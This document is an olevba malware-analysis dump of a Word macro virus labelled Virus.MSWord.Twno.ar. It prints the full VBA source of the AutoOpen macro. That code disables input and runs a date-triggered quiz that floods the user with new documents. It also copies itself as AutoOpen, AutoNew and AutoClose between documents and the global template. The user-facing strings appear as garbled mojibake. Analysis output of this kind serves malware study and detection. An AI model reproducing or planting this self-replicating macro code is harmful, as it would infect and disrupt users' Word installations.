olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Twno.ar-bedb66c320a0f94525d9262e6a56f3e70e6b376a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Twno.ar-bedb66c320a0f94525d9262e6a56f3e70e6b376a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Twno.ar-bedb66c320a0f94525d9262e6a56f3e70e6b376a - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Dim nm__()
Public Sub MAIN()
ReDim nm__(4)
Dim test
Dim con
Dim tog$
Dim i
Dim ans$
Dim j
Dim nor
Dim kk
Dim t
Dim file$
Dim filem$
Dim nor1
Dim kkk
Dim tt
WordBasic.DisableInput 1
If WordBasic.Day(WordBasic.Now()) = 32 Then
try:
On Error GoTo -1: On Error GoTo 0
On Error GoTo -1: On Error GoTo try
test = -1
con = 1
tog$ = ""
i = 0

        While test = -1

            For i = 0 To 4
            nm__(i) = WordBasic.Int(Rnd() * 10000)
            con = (con * nm__(i))
            If i = 4 Then
            tog$ = tog$ + Str(nm__(4)) + " =?"
            GoTo beg
            End If
            tog$ = tog$ + Str(nm__(i)) + " *"
            Next i
beg:
            WordBasic.Beep
            ans$ = WordBasic.[InputBox$]("¤µ¤Ñ¬O " + WordBasic.[Date$]() + " ,¸ò§Aª±¤@­Ó¤ßºâ¹CÀ¸" + Chr(13) + _
"­Y§Aµª¿ù,¥u¦n±µ¨ü¾_¾Ù±Ð¨|.............." + Chr(13) + _
tog$, "¥xÆW NO.1 Macro Virus")
        If WordBasic.[RTrim$](WordBasic.[LTrim$](ans$)) = WordBasic.[LTrim$](Str(con)) Then
            WordBasic.MsgBox "®¥¶P§Aµª¹ï¤F,«ö½T©w´N§i¶D§A·Qª¾¹Dªº....", _
                    "¥xÆW NO.1 Macro Virus"
            WordBasic.FileNewDefault
            WordBasic.CenterPara
            WordBasic.FormatFont Font:="²Ó©úÅé", Points:=16, Bold:=1, Underline:=1
            WordBasic.Beep
            WordBasic.Insert "¦ó¿×¥¨¶°¯f¬r¡H"
            WordBasic.InsertPara
            WordBasic.Beep
            WordBasic.Insert "µª®×:"
            WordBasic.Italic 1
            WordBasic.Insert "§Ú´N¬O....."
            WordBasic.InsertPara
            WordBasic.InsertPara
            WordBasic.Italic 0
            WordBasic.FormatFont Font:="²Ó©úÅé", Points:=16, Bold:=1, Underline:=1
            WordBasic.Beep
            WordBasic.Insert "¦p¦ó¹w¨¾¥¨¶°¯f¬r¡H"
            WordBasic.InsertPara
            WordBasic.Beep
            WordBasic.Insert "µª®×:"
            WordBasic.Italic 1
            WordBasic.Insert "¤£­n¬Ý§Ú....."
            GoTo exit_
            Else
            For j = 1 To 20
            WordBasic.Beep
            WordBasic.FileNewDefault
            Next j
            WordBasic.CenterPara
            WordBasic.FormatFont Font:="²Ó©úÅé", Points:=16, Bold:=1, Underline:=1
            WordBasic.Insert "¥¨¶°¯f¬r"
            GoTo try
            End If

        Wend
            End If

nor = WordBasic.CountMacros(0)
If nor > 0 Then
    For kk = 1 To nor
        If WordBasic.[MacroName$](kk, 0) = "AutoOpen" Then
        t = 1
        End If
        Next kk
        
End If

file$ = WordBasic.[FileName$]()
filem$ = file$ + ":AutoOpen"
If t <> 1 Then
    WordBasic.MacroCopy filem$, "AutoOpen"
    WordBasic.MacroCopy filem$, "AutoNew"
    WordBasic.MacroCopy filem$, "AutoClose"
End If

nor1 = WordBasic.CountMacros(1)
If nor1 > 0 Then
    For kkk = 1 To nor1
        If WordBasic.[MacroName$](kkk, 1) = "AutoOpen" Then
        tt = 1
        End If
        Next kkk
        
End If

If tt <> 1 Then
    WordBasic.FileSaveAs Format:=1
    WordBasic.MacroCopy "AutoOpen", filem$
End If

    

exit_:
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

